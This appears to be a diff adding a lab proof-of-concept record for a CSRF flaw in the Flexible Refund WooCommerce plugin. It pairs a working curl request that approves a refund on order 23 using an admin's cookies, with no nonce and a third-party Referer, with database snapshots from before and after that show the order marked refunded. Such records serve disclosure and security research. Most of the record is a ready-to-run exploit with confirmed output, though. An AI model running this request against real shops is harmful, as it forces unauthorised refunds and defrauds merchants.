@@ -1,0 +1,26 @@
+# FR-02 — CSRF: force an approved refund on any order against a logged-in admin/shop_manager
+# Lab: WordPress 7.1.2 + WooCommerce 11.1.2 + Flexible Refund 2.0.3. Fresh order 23 (never refunded).
+
+## DB BEFORE
+  order 23 status: wc-completed
+  shop_order_refund children of 23: 0
+
+## ATTACK — cross-site POST, NO nonce, external Referer, admin cookies (what the victim's browser sends)
+$ curl -b admin.cookies -H 'Referer: https://evil.example.com/' \
+   'http://localhost:8088/wp-admin/admin-ajax.php?action=fr_refund_request' \
+   --data 'order_ID=23' --data 'status=approved' \
+   --data 'form=fr_refund_form%5Bitems%5D%5B9%5D%5Bqty%5D=1'
+
+## RESPONSE
+  HTTP/1.1 200 OK
+  body: {"success":true,"data":{"order_id":"23","status":"approved"}}
+
+## DB AFTER
+  order 23 status: wc-refunded   <-- wc-refunded
+  shop_order_refund created under 23:
+    ID	post_status	post_parent
+    24	wc-completed	23
+    
+
+## Note: no nonce was sent and the Referer is a third-party origin; only the capability check runs,
+## which the victim (admin/shop_manager) already satisfies -> classic CSRF, CWE-352.
